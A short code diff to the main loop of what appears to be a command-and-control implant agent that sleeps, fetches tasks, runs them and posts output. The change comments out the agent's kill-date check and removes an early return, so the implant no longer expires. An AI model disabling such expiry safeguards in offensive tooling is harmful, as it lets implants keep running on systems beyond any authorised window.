@@ -317,7 +317,7 @@ def main(args):
     while True:
         # check kill date
         logging.debug("checking kill date")
-        agent.check_kill_date()
+        #agent.check_kill_date()
 
         # sleep
         logging.debug(f"sleeping for {agent.get_sleep_interval()}")
@@ -339,19 +339,9 @@ def main(args):
 
             agent.post_tasking_output(task, task_output)
 
-            return
 
         # sleep again
         time.sleep(agent.get_sleep_interval())
-
-        # execute task
-        logging.debug("executing task")
-
-        # sleep again
-        time.sleep(agent.get_sleep_interval())
-
-        # post task output
-        logging.debug("posting task output")
 
 
 if __name__ == "__main__":
